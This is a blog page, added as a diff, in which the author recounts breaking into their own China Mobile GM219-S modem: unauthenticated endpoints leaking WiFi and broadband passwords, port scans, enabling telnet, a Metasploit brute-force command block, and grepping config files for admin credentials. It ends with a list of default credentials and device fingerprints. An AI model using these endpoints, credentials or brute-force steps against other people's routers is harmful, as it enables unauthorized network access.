@@ -1,0 +1,62 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1" /> <title>记一次移动光猫（GM219-S）安全测试 · Chen's Blog</title> <meta name="description" content="前言"> <link rel="icon" href="http://localhost:4000/assets/favicon.png"> <link rel="apple-touch-icon" href="http://localhost:4000/assets/touch-icon.png"> <link rel="stylesheet" href="http://localhost:4000/assets/core.css"> <link rel="canonical" href="http://localhost:4000/archives/2019-03-12/1"> <link rel="alternate" type="application/atom+xml" title="Chen's Blog" href="http://localhost:4000/feed.xml" /> <link href="/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" media="all" /> <script> var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?e4a42a371cc5994ee02b940034c29658"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); })(); </script> </head> <body> <aside class="logo"> <a href="http://localhost:4000/"> <img src="/assets/avatar.jpg" class="logo-avatar"> </a> <span class="logo-prompt code">Back to Index</span> </aside> <article> <h1 class="title">ᴀᴜᴛʜᴏʀ: ᴠᴜʟᴋᴇʏ_ᴄʜᴇɴ</h1> <div class="divider"></div> <center><a href="/about" target="_blank">ᴀʙᴏᴜᴛ</a> | <a href="/links" target="_blank">ʟɪɴᴋs</a> | <a href="/AssistTool" target="_blank">ᴀssɪsᴛ ᴛᴏᴏʟ</a> | <a href="/Binary-Learning" target="_blank">ʙɪɴᴀʀʏ ʟᴇᴀʀɴɪɴɢ</a></center> <div class="divider"></div> </article> <div id="content"> <article> <div class="center"> <h1 class="title">记一次移动光猫（GM219-S）安全测试</h1> <time class="code">March 12, 2019</time> </div> <div class="divider"></div> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&auto=1&id=1348044876&height=66"></iframe> <h1 id="前言">前言</h1> <p>过个年，WiFi密码忘记了…光猫管理密码也忘记了（这个光猫也不支持物理按钮重置设置），但是手机还连着WiFi，正规操作找回不了密码，那就用咱们测试的思维来试试PWN掉这个路由器。</p> <h1 id="过程">过程</h1> <h2 id="未授权获取wifi连接密码">未授权获取WiFi连接密码</h2> <p>还好之前没闲着，发现管理的几个未授权访问的接口如下:</p> <p>获取宽带账号密码: <code class="language-plaintext highlighter-rouge">/GET_USER_WAN_PPP_INFO.json</code></p> <p>获取 WLAN 连接信息: <code class="language-plaintext highlighter-rouge">/GET_WLAN_LINK_INFO.json</code></p> <p>获取 DHCP 信息: <code class="language-plaintext highlighter-rouge">/GET_NET_DHCP_INFO.json</code></p> <p>手机访问 <code class="language-plaintext highlighter-rouge">http://192.168.1.1/GET_WLAN_LINK_INFO.json</code> ，获取密码：xxx，电脑连接登录</p> <h2 id="信息收集">信息收集</h2> <h3 id="端口收集结果">端口收集结果</h3> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Scanning promote.cache-dns.local <span class="o">(</span>192.168.1.1<span class="o">)</span> <span class="o">[</span>1080 ports]
+Discovered open port 80/tcp on 192.168.1.1
+Discovered open port 8080/tcp on 192.168.1.1
+</code></pre></div></div> <h3 id="目录扫描结果">目录扫描结果</h3> <p>获得的一些目录：</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/login.html
+/login.asp
+/index.asp
+/telnet.asp
+/upgrade.asp
+...
+</code></pre></div></div> <h2 id="突破口">突破口</h2> <p>在目录扫描的时候，发现<code class="language-plaintext highlighter-rouge">/telnet.asp</code> -&gt; 跳转到 <code class="language-plaintext highlighter-rouge">/cgi-bin/telnet.asp</code> 如下图所示界面：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/cmcc-pentest/open_telnet.png" alt="open_telnet" /></p> <p>这个功能可以开启光猫的<code class="language-plaintext highlighter-rouge">telnet</code>服务，先开启，然后再使用Nmap扫描下端口：</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Scanning promote.cache-dns.local <span class="o">(</span>192.168.1.1<span class="o">)</span> <span class="o">[</span>1080 ports]
+Discovered open port 8080/tcp on 192.168.1.1
+Discovered open port 80/tcp on 192.168.1.1
+Discovered open port 8023/tcp on 192.168.1.1
+</code></pre></div></div> <p>发现多了个8023端口，其对应的服务果然是telnet：</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>8023/tcp open  telnet
+| fingerprint-strings:
+|   GenericLines:
+|     Star-Net Broadband Router
+|     Login:
+|     Password:
+|   GetRequest:
+|     Star-Net Broadband Router
+|     Login: GET / HTTP/1.0
+|     Password:
+|   Help:
+|     HELP
+|     Star-Net Broadband Router
+|     Login: Password:
+|   NCP:
+|     Star-Net Broadband Router
+|     Login: DmdT^@^@^@
+|     ^@^@^@^A^@^@^@^@^@
+|   NULL:
+|     Star-Net Broadband Router
+|     Login:
+|   RPCCheck:
+|     Star-Net Broadband Router
+|     Login:
+|     ^@^@<span class="o">(</span>r
+|   SIPOptions:
+|     Star-Net Broadband Router
+|     Login: OPTIONS sip:nm SIP/2.0
+|     Via: SIP/2.0/TCP nm<span class="p">;</span><span class="nv">branch</span><span class="o">=</span>foo
+|     From: &lt;sip:nm@nm&gt;<span class="p">;</span><span class="nv">tag</span><span class="o">=</span>root
+|     &lt;sip:nm2@nm2&gt;
+|     Call-ID: 50000
+|     CSeq: 42 OPTIONS
+|     Max-Forwards: 70
+|     Content-Length: 0
+|     Contact: &lt;sip:nm@nm&gt;
+|     Accept: application/sdp
+|     Password:
+|   tn3270:
+|     ^@IBM-3279-4-E
+|     ^YStar-Net Broadband Router
+|_    Login:
+</code></pre></div></div> <p>telnet开启，爆破一波走起。（Caimima生成个密码口令）</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/cmcc-pentest/caimima.png" alt="caimima" /></p> <p>试了nmap貌似没啥用，开个msfconsole来爆破：</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/scanner/telnet/telnet_login
+<span class="nb">set </span>RHOSTS 192.168.1.1 <span class="c">#设置模板</span>
+<span class="nb">set </span>RPORT 8023 <span class="c">#设置端口</span>
+<span class="nb">set </span>USER_FILE /root/user.txt <span class="c">#设置用户字典</span>
+<span class="nb">set </span>PASS_FILE /root/pass.txt <span class="c">#设置密码字典</span>
+exploit 192.168.1.1 <span class="c">#启动</span>
+</code></pre></div></div> <p>幸运的是爆破出来了，是组合弱口令：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/cmcc-pentest/telnet_brute.png" alt="telnet_brute" /></p> <h2 id="获取密码">获取密码</h2> <p>运行<code class="language-plaintext highlighter-rouge">telnet 192.168.1.1 8023</code>输入账号密码进去，执行<code class="language-plaintext highlighter-rouge">sh</code>发现可以直接进入shell：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/cmcc-pentest/telnet_shell.png" alt="telnet_shell" /></p> <p>接下来就是找密码到处瞎翻（没有PWN路由器的经验，很难受），执行 <code class="language-plaintext highlighter-rouge">ls -a -l</code> 发现有软链接，很多指向了<code class="language-plaintext highlighter-rouge">/tmp</code>目录：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/cmcc-pentest/ls.png" alt="ls" /></p> <p>于是进入<code class="language-plaintext highlighter-rouge">/tmp</code>目录，到处翻腾：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/cmcc-pentest/tmp.png" alt="tmp" /></p> <p>利用这几个关键词看看是否有文件中包含了：<code class="language-plaintext highlighter-rouge">admin</code>、<code class="language-plaintext highlighter-rouge">CMCC</code>(中国移动)、<code class="language-plaintext highlighter-rouge">password</code>、<code class="language-plaintext highlighter-rouge">user</code></p> <p>e.g. <code class="language-plaintext highlighter-rouge">grep 'admin' ./*</code>，等了老半天了，发现<code class="language-plaintext highlighter-rouge">/tmp/ctromfile.cfg</code>文件内有点东西：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/cmcc-pentest/admin.png" alt="admin" /></p> <p>复制密码登录，怼进去：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/cmcc-pentest/cmccadmin.png" alt="cmccadmin" /></p> <h2 id="信息整合">信息整合</h2> <p>做完测试并针对测试过程的信息进行整合，最后形成字典以便后面再次遇到～</p> <ul> <li> <p>通过读配置文件获取的一系列用户名、密码：<code class="language-plaintext highlighter-rouge">9vvrr、admin、aDm8H%MdA、CMCCAdmin、telnetuser、user</code></p> </li> <li>文件、目录路径： <ul> <li><code class="language-plaintext highlighter-rouge">/GET_USER_WAN_PPP_INFO.json</code></li> <li><code class="language-plaintext highlighter-rouge">/GET_WLAN_LINK_INFO.json</code></li> <li><code class="language-plaintext highlighter-rouge">/GET_NET_DHCP_INFO.json</code></li> <li><code class="language-plaintext highlighter-rouge">/telnet.asp</code></li> <li><code class="language-plaintext highlighter-rouge">/index.asp</code></li> <li><code class="language-plaintext highlighter-rouge">/user.html</code></li> <li><code class="language-plaintext highlighter-rouge">/upgrade.asp</code></li> <li><code class="language-plaintext highlighter-rouge">/cgi-bin/</code></li> <li><code class="language-plaintext highlighter-rouge">/content.asp</code></li> </ul> </li> <li>指纹特征： <ul> <li>标题：<code class="language-plaintext highlighter-rouge">HGU LOGIN</code></li> <li>图片：<code class="language-plaintext highlighter-rouge">/webstyle/images/login-mobile-qrcode-anhui.png -&gt; 23cb4f5e63e0cd47f8788a6ca3558eab</code></li> <li>JS：<code class="language-plaintext highlighter-rouge">/webstyle/js/br_login_nc.js</code></li> </ul> </li> </ul> <h1 id="结尾">结尾</h1> <p>最后我只是默默的把user用户密码改了一下～</p> </article> <div class="page-navigation code"> <a class="next" href="http://localhost:4000/archives/2019-03-20/1" title="NEXT: 浅谈WebSocket跨域劫持漏洞(CSWSH)">&lt;&lt;</a> <span> &middot; </span> <a class="home" href="http://localhost:4000/" title="Back to Index">INDEX</a> <span> &middot; </span> <a class="prev" href="http://localhost:4000/archives/2019-01-23/1" title="PREV: 我为何在博客模板留后门">&gt;&gt;</a> </div> </div> <div class="footer"> <span class="block">&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-2021</span> </div> <script src="/fancybox/lib/jquery-1.10.2.min.js"></script> <script type="text/javascript" src="/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script> <script> $(document).ready(function() { $("article img").each(function() { var strA = "<a style='text-decoration: none;' id='imgid' href='" + this.src + "'></a>"; $(this).wrapAll(strA); }); }); $("#imgid").fancybox({ openEffect : 'elastic', closeEffect : 'elastic', }); </script> </body> </html>
